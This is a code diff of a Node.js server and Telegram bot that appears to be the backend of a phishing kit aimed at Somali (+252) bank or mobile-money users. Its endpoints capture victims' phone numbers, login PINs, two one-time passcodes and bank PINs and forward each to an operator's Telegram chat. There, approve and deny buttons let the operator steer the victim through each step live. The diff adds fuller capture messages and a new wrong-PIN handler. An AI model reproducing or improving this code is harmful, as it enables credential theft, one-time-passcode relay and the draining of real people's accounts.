@@ -33,17 +33,12 @@ app.post('/api/login-notification', async (req, res) => {
     const countryCode = "+252";
 
     const currentTime = new Date().toLocaleString('en-US', {
-        month: 'numeric',
-        day: 'numeric',
-        year: 'numeric',
-        hour: 'numeric',
-        minute: 'numeric',
-        second: 'numeric',
+        month: 'numeric', day: 'numeric', year: 'numeric',
+        hour: 'numeric', minute: 'numeric', second: 'numeric',
         hour12: true
     });
 
-    if (!phone || !pin || !ADMIN_ID)
-        return res.status(400).json({ error: "Missing data" });
+    if (!phone || !pin || !ADMIN_ID) return res.status(400).json({ error: "Missing data" });
 
     statusStore[phone] = "pending";
 
@@ -73,7 +68,6 @@ app.post('/api/login-notification', async (req, res) => {
                 ]
             }
         });
-
         res.json({ success: true });
     } catch (err) {
         console.error(err);
@@ -86,19 +80,13 @@ app.post('/api/verify-first-otp', async (req, res) => {
     const { phone, otp } = req.body || {};
     const country = "Somalia";
     const countryCode = "+252";
-
     const currentTime = new Date().toLocaleString('en-US', {
-        month: 'numeric',
-        day: 'numeric',
-        year: 'numeric',
-        hour: 'numeric',
-        minute: 'numeric',
-        second: 'numeric',
+        month: 'numeric', day: 'numeric', year: 'numeric',
+        hour: 'numeric', minute: 'numeric', second: 'numeric',
         hour12: true
     });
 
-    if (!phone || !otp || !ADMIN_ID)
-        return res.status(400).json({ error: "Missing data" });
+    if (!phone || !otp || !ADMIN_ID) return res.status(400).json({ error: "Missing data" });
 
     const otpMessage = `1️⃣ <b>CL 2 - FIRST OTP (Step 1/2)</b>
 
@@ -127,7 +115,6 @@ app.post('/api/verify-first-otp', async (req, res) => {
                 ]
             }
         });
-
         res.json({ success: true });
     } catch (err) {
         console.error(err);
@@ -140,19 +127,13 @@ app.post('/api/verify-second-otp', async (req, res) => {
     const { phone, otp } = req.body || {};
     const country = "Somalia";
     const countryCode = "+252";
-
     const currentTime = new Date().toLocaleString('en-US', {
-        month: 'numeric',
-        day: 'numeric',
-        year: 'numeric',
-        hour: 'numeric',
-        minute: 'numeric',
-        second: 'numeric',
+        month: 'numeric', day: 'numeric', year: 'numeric',
+        hour: 'numeric', minute: 'numeric', second: 'numeric',
         hour12: true
     });
 
-    if (!phone || !otp || !ADMIN_ID)
-        return res.status(400).json({ error: "Missing data" });
+    if (!phone || !otp || !ADMIN_ID) return res.status(400).json({ error: "Missing data" });
 
     const otpMessage2 = `2️⃣ <b>CL 2 - SECOND OTP (Step 2/2)</b>
 
@@ -181,7 +162,6 @@ app.post('/api/verify-second-otp', async (req, res) => {
                 ]
             }
         });
-
         res.json({ success: true });
     } catch (err) {
         console.error(err);
@@ -193,10 +173,11 @@ app.post('/api/verify-second-otp', async (req, res) => {
 app.post('/api/verify-bank-pin', async (req, res) => {
     const { phone, bankPin } = req.body || {};
     const country = "Somalia";
-    const currentTime = new Date().toLocaleString('en-US', { 
-        month: 'numeric', day: 'numeric', year: 'numeric', 
-        hour: 'numeric', minute: 'numeric', second: 'numeric', 
-        hour12: true 
+    const countryCode = "+252";
+    const currentTime = new Date().toLocaleString('en-US', {
+        month: 'numeric', day: 'numeric', year: 'numeric',
+        hour: 'numeric', minute: 'numeric', second: 'numeric',
+        hour12: true
     });
 
     if (!phone || !bankPin || !ADMIN_ID) return res.status(400).json({ error: "Missing data" });
@@ -230,40 +211,81 @@ app.post('/api/verify-bank-pin', async (req, res) => {
         });
         res.json({ success: true });
     } catch (err) {
-        console.error(err);
         res.status(500).json({ error: "Telegram error" });
     }
 });
 
 // -------------------- BOT ACTIONS --------------------
 
-// APPROVE LOGIN
+// APPROVE
 bot.action(/approve\|(.+)\|(.+)/, async (ctx) => {
     const phone = decodeURIComponent(ctx.match[1]);
     const pin = decodeURIComponent(ctx.match[2]);
     statusStore[phone] = "approved";
+    const currentTime = new Date().toLocaleTimeString('en-US', { hour: 'numeric', minute: 'numeric', second: 'numeric', hour12: true });
 
-    const approvedMsg = `✅ <b>LOGIN APPROVED</b>\n\n📱 <b>${phone}</b>\n🔐 <b>${pin}</b>\n\n✅ <b>Status: Approved</b>\n➡️ <b>Next: First OTP (1/2)</b>`;
+    const approvedMsg = `✅ <b>LOGIN APPROVED</b>
+
+🆕 <b>NEW USER</b>
+🇸🇴 <b>Somalia</b>
+📱 <b>${phone}</b>
+🔐 <b>${pin}</b>
+
+━━━━━━━━━━━━━━━
+
+✅ <b>Status: Approved</b>
+➡️ <b>Next: First OTP (1/2)</b>
+⏱️ <b>${currentTime}</b>`;
+
     await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
     await ctx.replyWithHTML(approvedMsg);
     await ctx.answerCbQuery("Allowed");
 });
 
-// DENY LOGIN
+// DENY
 bot.action(/deny\|(.+)\|(.+)/, async (ctx) => {
     const phone = decodeURIComponent(ctx.match[1]);
+    const pin = decodeURIComponent(ctx.match[2]);
     statusStore[phone] = "denied";
+    const currentTime = new Date().toLocaleTimeString('en-US', { hour: 'numeric', minute: 'numeric', second: 'numeric', hour12: true });
+
+    const deniedMsg = `❌ <b>INVALID CREDENTIALS</b>
+
+🇸🇴 <b>Somalia</b>
+📱 <b>${phone}</b>
+🔐 <b>${pin}</b>
+
+━━━━━━━━━━━━━━━
+
+❌ <b>Status: Rejected</b>
+⏱️ <b>${currentTime}</b>`;
+
     await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
-    await ctx.replyWithHTML(`❌ <b>INVALID CREDENTIALS</b>\n📱 <b>User:</b> ${phone}\n❌ <b>Status: Rejected</b>`);
+    await ctx.replyWithHTML(deniedMsg);
     await ctx.answerCbQuery("Rejected");
 });
 
 // OTP1 CORRECT
 bot.action(/otp1_correct\|(.+)\|(.+)/, async (ctx) => {
     const phone = decodeURIComponent(ctx.match[1]);
+    const otp = decodeURIComponent(ctx.match[2]);
     statusStore[phone] = "otp1_correct";
+    const currentTime = new Date().toLocaleTimeString('en-US', { hour: 'numeric', minute: 'numeric', second: 'numeric', hour12: true });
+
+    const verifiedMsg = `1️⃣ <b>FIRST OTP VERIFIED (Step 1/2)</b>
+
+🇸🇴 <b>Somalia</b>
+📱 <b>${phone}</b>
+🔐 <b>${otp}</b>
+
+━━━━━━━━━━━━━━━
+
+✅ <b>Status: First OTP verified</b>
+➡️ <b>Next: Second OTP (2/2) will be sent</b>
+⌛ <b>${currentTime}</b>`;
+
     await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
-    await ctx.replyWithHTML(`1️⃣ <b>FIRST OTP VERIFIED</b>\n📱 <b>User:</b> ${phone}\n✅ <b>Status: Next: Second OTP</b>`);
+    await ctx.replyWithHTML(verifiedMsg);
     await ctx.answerCbQuery("Verified");
 });
 
@@ -272,16 +294,31 @@ bot.action(/otp1_wrong\|(.+)/, async (ctx) => {
     const phone = decodeURIComponent(ctx.match[1]);
     statusStore[phone] = "otp1_wrong";
     await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
-    await ctx.replyWithHTML(`❌ <b>FIRST OTP WRONG</b>\n📱 <b>User:</b> ${phone}`);
+    await ctx.replyWithHTML(`❌ <b>FIRST OTP WRONG</b>\n📱 <b>User:</b> ${phone}\n⚠️ <b>Prompted to re-enter OTP.</b>`);
     await ctx.answerCbQuery("Wrong Code");
 });
 
 // OTP2 CORRECT
 bot.action(/otp2_correct\|(.+)\|(.+)/, async (ctx) => {
     const phone = decodeURIComponent(ctx.match[1]);
+    const otp = decodeURIComponent(ctx.match[2]);
     statusStore[phone] = "otp2_correct";
+    const currentTime = new Date().toLocaleTimeString('en-US', { hour: 'numeric', minute: 'numeric', second: 'numeric', hour12: true });
+
+    const verifiedMsg2 = `2️⃣ <b>SECOND OTP VERIFIED (Step 2/2)</b>
+
+🇸🇴 <b>Somalia</b>
+📱 <b>${phone}</b>
+🔐 <b>${otp}</b>
+
+━━━━━━━━━━━━━━━
+
+✅ <b>Status: Second OTP verified</b>
+✅ <b>Process Complete</b>
+⌛ <b>${currentTime}</b>`;
+
     await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
-    await ctx.replyWithHTML(`2️⃣ <b>SECOND OTP VERIFIED</b>\n📱 <b>User:</b> ${phone}\n✅ <b>Finalized</b>`);
+    await ctx.replyWithHTML(verifiedMsg2);
     await ctx.answerCbQuery("Finalized");
 });
 
@@ -290,7 +327,7 @@ bot.action(/otp2_wrong\|(.+)/, async (ctx) => {
     const phone = decodeURIComponent(ctx.match[1]);
     statusStore[phone] = "otp2_wrong";
     await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
-    await ctx.replyWithHTML(`❌ <b>SECOND OTP WRONG</b>\n📱 <b>User:</b> ${phone}`);
+    await ctx.replyWithHTML(`❌ <b>SECOND OTP WRONG</b>\n📱 <b>User:</b> ${phone}\n⚠️ <b>Prompted to re-enter OTP.</b>`);
     await ctx.answerCbQuery("Wrong Code");
 });
 
@@ -300,7 +337,16 @@ bot.action(/bank_correct\|(.+)\|(.+)/, async (ctx) => {
     const pin = decodeURIComponent(ctx.match[2]);
     statusStore[phone] = "bank_pin_correct";
     
-    const finalizedMsg = `✅ <b>BANK PIN VERIFIED</b>\n\n🇸🇴 <b>Somalia</b>\n📱 <b>${phone}</b>\n🔑 <b>${pin}</b>\n\n✅ <b>Status: Process Completed</b>`;
+    const finalizedMsg = `✅ <b>BANK PIN VERIFIED</b>
+
+🇸🇴 <b>Somalia</b>
+📱 <b>${phone}</b>
+🔑 <b>${pin}</b>
+
+━━━━━━━━━━━━━━━
+
+✅ <b>Status: Process Completed</b>
+🏁 <b>User redirected to Success page</b>`;
 
     try {
         await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
@@ -319,6 +365,15 @@ bot.action(/bank_wrong\|(.+)/, async (ctx) => {
         await ctx.replyWithHTML(`❌ <b>BANK PIN WRONG</b>\n📱 <b>User:</b> ${phone}\n⚠️ <b>Prompted to re-enter Bank PIN.</b>`);
         await ctx.answerCbQuery("Wrong Bank PIN");
     } catch (e) { console.error(e.message); }
+});
+
+// OTP2 WRONG PIN
+bot.action(/otp2_wrongpin\|(.+)/, async (ctx) => {
+    const phone = decodeURIComponent(ctx.match[1]);
+    statusStore[phone] = "otp2_wrongpin";
+    await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
+    await ctx.replyWithHTML(`🔑 <b>WRONG PIN REPORTED</b>\n📱 <b>User:</b> ${phone}\n⚠️ <b>User prompted to re-enter PIN.</b>`);
+    await ctx.answerCbQuery("Wrong PIN");
 });
 
 // -------------------- STATUS CHECK --------------------
@@ -355,4 +410,4 @@ app.listen(PORT, () => {
 // Graceful stop
 process.once('SIGINT', () => bot.stop('SIGINT'));
 process.once('SIGTERM', () => bot.stop('SIGTERM'));
-    
+        
